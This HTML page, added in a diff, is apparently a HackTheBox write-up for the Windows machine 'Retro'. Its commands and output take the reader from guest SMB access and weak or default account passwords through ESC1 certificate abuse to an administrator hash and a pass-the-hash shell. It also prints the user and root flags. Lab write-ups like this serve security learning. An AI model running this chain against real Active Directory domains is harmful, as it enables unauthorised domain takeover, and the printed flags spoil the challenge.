@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retro - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            color: #00d9ff;
+            margin-top: 1.5em;
+            margin-bottom: 0.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Highlight boxes */
+        .highlight {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .highlight strong {
+            color: #ffc107;
+        }
+
+        .success {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #28a745;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .success strong {
+            color: #28a745;
+        }
+
+        .warning {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #dc3545;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .warning strong {
+            color: #dc3545;
+        }
+
+        /* Step boxes */
+        .step {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .step h4 {
+            margin-top: 0;
+            color: #00d9ff;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    
+        /* Screenshot slot wrapper (added for repo build) */
+        .shot { margin: 1.5em 0; }
+        .shot img { margin: 0; }
+</style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Retro</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Name:</strong> Retro</p>
+        <p><strong>OS:</strong> Windows</p>
+        <p><strong>Difficulty:</strong> Easy</p>
+        <p><strong>IP Address:</strong> 10.129.234.44</p>
+        <p><strong>Release Date:</strong> 24 June 2025</p>
+        <p><strong>Points:</strong> 20</p>
+    </div>
+
+    <h2>Summary</h2>
+    <p>Retro is an easy Windows Active Directory machine that demonstrates several common misconfigurations in enterprise environments. The attack path consists of:</p>
+    <ol>
+        <li>Anonymous SMB enumeration revealing hints about weak credentials</li>
+        <li>Exploiting a shared trainee account with a trivial password</li>
+        <li>Discovering and exploiting a Pre-Windows 2000 computer account</li>
+        <li>Abusing misconfigured Active Directory Certificate Services (ESC1)</li>
+        <li>Gaining Domain Administrator access</li>
+    </ol>
+    <h2>Tool Overview</h2>
+    <p>Before diving in, a quick explanation of the tools used:</p>
+    <ul>
+        <li><strong>Nmap</strong> — discovers open ports and running services. Flags: <code>-sC</code> (default scripts), <code>-sV</code> (versions), <code>-T4</code> (timing), <code>-p-</code> (all ports).</li>
+        <li><strong>NetExec (formerly CrackMapExec)</strong> — AD post-exploitation: test credentials and enumerate shares/users. Options: <code>--shares</code>, <code>--rid-brute</code>, <code>-u</code>, <code>-p</code>.</li>
+        <li><strong>SMBClient</strong> — access SMB/CIFS shares. Commands: <code>dir</code>/<code>ls</code>, <code>get &lt;file&gt;</code>, <code>cd</code>.</li>
+        <li><strong>Certipy</strong> — enumerate and abuse AD Certificate Services. Commands: <code>find</code>, <code>req</code>, <code>auth</code>.</li>
+        <li><strong>Impacket (changepasswd.py)</strong> — change AD passwords over various protocols.</li>
+        <li><strong>Evil-WinRM</strong> — PowerShell session over WinRM. Options: <code>-i</code>, <code>-u</code>, <code>-H</code> (pass-the-hash).</li>
+    </ul>
+    <h2>Reconnaissance</h2>
+    <h3>Initial Port Scan</h3>
+    <pre><code>nmap 10.129.234.44 -sC -sV -T4</code></pre>
+    <p><strong>Results:</strong></p>
+    <pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+60020/tcp open  msrpc         Microsoft Windows RPC</code></pre>
+    <div class="shot">
+        <img src="retro_01.png" alt="nmap scan identifying the Windows Domain Controller"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_01.png</code><br>nmap scan identifying the Windows Domain Controller</div>
+    </div>
+    <h3>Analyzing the Scan Results</h3>
+    <p>The open ports indicate this is a Windows Domain Controller (DNS, Kerberos, MSRPC, SMB, LDAP/LDAPS, RDP). Key findings: Domain retro.vl, Hostname DC, OS Windows Server 2022 (Build 20348), FQDN DC.retro.vl.</p>
+    <pre><code>echo "10.129.234.44 DC.retro.vl retro.vl DC" | sudo tee -a /etc/hosts</code></pre>
+    <h2>Initial Access - SMB Enumeration</h2>
+    <h3>Testing Anonymous/Guest Access</h3>
+    <pre><code>netexec smb 10.129.234.44 -u guest -p '' --shares</code></pre>
+    <pre><code>SMB  10.129.234.44  445  DC  [+] retro.vl\guest:
+SMB  10.129.234.44  445  DC  Share       Permissions  Remark
+SMB  10.129.234.44  445  DC  IPC$        READ         Remote IPC
+SMB  10.129.234.44  445  DC  NETLOGON                 Logon server share
+SMB  10.129.234.44  445  DC  Notes
+SMB  10.129.234.44  445  DC  SYSVOL                   Logon server share
+SMB  10.129.234.44  445  DC  Trainees    READ</code></pre>
+    <div class="highlight">
+    <p><strong>Key finding:</strong> The guest account has READ access to the Trainees share! This is unusual and worth investigating.</p>
+    </div>
+    <div class="shot">
+        <img src="retro_02.png" alt="netexec guest share enumeration showing Trainees READ"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_02.png</code><br>netexec guest share enumeration showing Trainees READ</div>
+    </div>
+    <h3>Exploring the Trainees Share</h3>
+    <pre><code>smbclient //10.129.234.44/Trainees -U 'Guest'
+smb: \&gt; get Important.txt</code></pre>
+    <p><strong>Contents of Important.txt:</strong></p>
+    <pre><code>Dear Trainees,
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+Stop bothering us. Please. We have other stuff to do than resetting your password every day.
+Regards
+The Admins</code></pre>
+    <p>The note reveals a shared trainee account with a password that is probably trivial — likely the username itself.</p>
+    <h3>Testing Credentials</h3>
+    <pre><code>netexec smb dc.retro.vl -u trainee -p trainee
+SMB  10.129.234.44  445  DC  [+] retro.vl\trainee:trainee</code></pre>
+    <p>Success! The credentials <code>trainee:trainee</code> are valid. With them we also gain access to the Notes share:</p>
+    <pre><code>smbclient //10.129.234.44/Notes -U 'Trainee'
+smb: \&gt; get ToDo.txt
+smb: \&gt; get user.txt</code></pre>
+    <h4>First Flag: user.txt</h4>
+    <pre><code>cat user.txt
+cbda362cff2099072c5e96c51712ff33</code></pre>
+    <h4>Analyzing ToDo.txt</h4>
+    <pre><code>Thomas,
+after convincing the finance department to get rid of their ancienct banking software
+it is finally time to clean up the mess they made. We should start with the pre created
+computer account. That one is older than me.
+Best
+James</code></pre>
+    <p>A strong hint about an old banking-related "pre created computer account" — a Pre-Windows 2000 computer account vulnerability.</p>
+    <h2>Privilege Escalation Path</h2>
+    <h3>User Enumeration via RID Brute Force</h3>
+    <pre><code>netexec smb dc.retro.vl -u guest -p '' --rid-brute</code></pre>
+    <pre><code>500: RETRO\Administrator  (SidTypeUser)
+1000: RETRO\DC$           (SidTypeUser)
+1104: RETRO\trainee       (SidTypeUser)
+1106: RETRO\BANKING$      (SidTypeUser)
+1107: RETRO\jburley       (SidTypeUser)
+1109: RETRO\tblack        (SidTypeUser)</code></pre>
+    <div class="highlight">
+    <p><strong>Key finding:</strong> <code>RETRO\BANKING$</code> — this is the computer account the note was referring to!</p>
+    </div>
+    <h3>Pre-Windows 2000 Computer Accounts</h3>
+    <p>Pre-created computer accounts had a default password set to the computer name in lowercase, without the <code>$</code> suffix. So for <code>BANKING$</code> the default password would be <code>banking</code>.</p>
+    <pre><code>netexec smb dc.retro.vl -u 'BANKING$' -p banking
+SMB  ...  [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code></pre>
+    <p><code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> actually confirms the password is correct — the account just is not activated for interactive logon. It differs from the <code>STATUS_LOGON_FAILURE</code> you would get with a wrong password.</p>
+    <h3>Changing the BANKING$ Password</h3>
+    <p>Since we cannot authenticate directly over SMB, we change the password over another protocol with Impacket's <code>changepasswd.py</code>:</p>
+    <pre><code>python3 changepasswd.py -newpass 0xdf0xdf 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr
+[*] Password was changed successfully.
+
+netexec smb dc.retro.vl -u 'BANKING$' -p 0xdf0xdf
+SMB  ...  [+] retro.vl\BANKING$:0xdf0xdf</code></pre>
+    <h2>ADCS Exploitation (ESC1)</h2>
+    <h3>Enumerating Certificate Services</h3>
+    <pre><code>certipy find -u 'BANKING$@retro.vl' -p 0xdf0xdf -vulnerable -stdout</code></pre>
+    <pre><code>Certificate Templates
+  Template Name         : RetroClients
+  Client Authentication : True
+  Enrollee Supplies Subject : True
+  Enrollment Rights     : RETRO.VL\Domain Computers ...
+  Minimum RSA Key Length : 4096
+  [!] Vulnerabilities
+    ESC1 : 'RETRO.VL\Domain Computers' can enroll, enrollee supplies
+           subject and template allows client authentication</code></pre>
+    <div class="shot">
+        <img src="retro_03.png" alt="Certipy find output flagging the ESC1 vulnerable template"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_03.png</code><br>Certipy find output flagging the ESC1 vulnerable template</div>
+    </div>
+    <h3>Understanding ESC1</h3>
+    <p>ESC1 lets the requester supply the subject (Enrollee Supplies Subject = True), the cert allows Client Authentication, and low-privileged users (Domain Computers) can enroll. As <code>BANKING$</code> we can request a certificate claiming to be for "administrator" and authenticate as them.</p>
+    <h3>Requesting a Certificate</h3>
+    <p>First attempt fails on key size (the template requires 4096 bits, Certipy defaults to 2048). We add <code>-key-size 4096</code>, then include the administrator SID (domain SID + RID 500):</p>
+    <pre><code>certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf -ca retro-DC-CA -template RetroClients \
+  -upn administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
+[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Saved certificate and private key to 'administrator.pfx' </code></pre>
+    <h3>Authenticating with the Certificate</h3>
+    <pre><code>certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
+[*] Got hash for 'administrator@retro.vl':
+aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</code></pre>
+    <h2>Getting an Administrator Shell</h2>
+    <pre><code>evil-winrm -i dc.retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre>
+    <div class="shot">
+        <img src="retro_04.png" alt="Evil-WinRM session as administrator (pass-the-hash)"
+             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
+        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>retro_04.png</code><br>Evil-WinRM session as administrator (pass-the-hash)</div>
+    </div>
+    <h3>Retrieving the Root Flag</h3>
+    <pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+40fce9c3f09024bcab29d377ee1ed071</code></pre>
+    <h2>Lessons Learned</h2>
+    <ul>
+        <li>Disable guest access to SMB shares and enforce strong passwords, even for shared accounts.</li>
+        <li>Remove or properly secure Pre-Windows 2000 computer accounts.</li>
+        <li>Regularly audit ADCS certificate templates for ESC vulnerabilities.</li>
+        <li>Notes and README files often contain valuable information.</li>
+        <li>Read error messages carefully — key size and SID requirements both mattered here.</li>
+    </ul>
+    <h2>Tools Used</h2>
+    <table>
+        <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+        <tbody>
+            <tr><td>Nmap</td><td>Port scanning and service enumeration</td></tr>
+            <tr><td>NetExec</td><td>SMB enumeration and credential testing</td></tr>
+            <tr><td>SMBClient</td><td>Accessing and downloading files from SMB shares</td></tr>
+            <tr><td>Impacket (changepasswd.py)</td><td>Changing the Pre-2000 computer account password</td></tr>
+            <tr><td>Certipy</td><td>ADCS enumeration and exploitation</td></tr>
+            <tr><td>Evil-WinRM</td><td>Remote PowerShell access over WinRM</td></tr>
+        </tbody>
+    </table>
+    <h2>Flags</h2>
+    <ul>
+        <li>User Flag: <code>cbda362cff2099072c5e96c51712ff33</code></li>
+        <li>Root Flag: <code>40fce9c3f09024bcab29d377ee1ed071</code></li>
+    </ul>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
